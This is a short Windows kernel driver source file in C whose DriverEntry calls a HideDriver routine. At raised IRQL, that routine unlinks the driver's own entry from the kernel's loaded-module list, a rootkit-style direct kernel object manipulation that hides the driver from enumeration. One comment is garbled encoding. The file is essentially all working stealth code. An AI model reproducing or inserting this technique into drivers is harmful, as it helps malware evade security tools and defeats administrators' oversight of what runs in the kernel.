#include <ntddk.h>
#include <windef.h>


typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


void HideDriver(IN PDRIVER_OBJECT DriverObject) {

	KIRQL irql = KeRaiseIrqlToDpcLevel(); //


	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
	modEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;

	//Ë«Á´±í²Ù×÷
	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;
	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
	

	KeLowerIrql(irql);
}




VOID Unload(IN PDRIVER_OBJECT DriverObject) {
	//KdBreakPoint();
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoaded.\n");

	return;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath) {
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver running.\n");
	(*DriverObject).DriverUnload = Unload;
	HideDriver(DriverObject);

	return(STATUS_SUCCESS);
}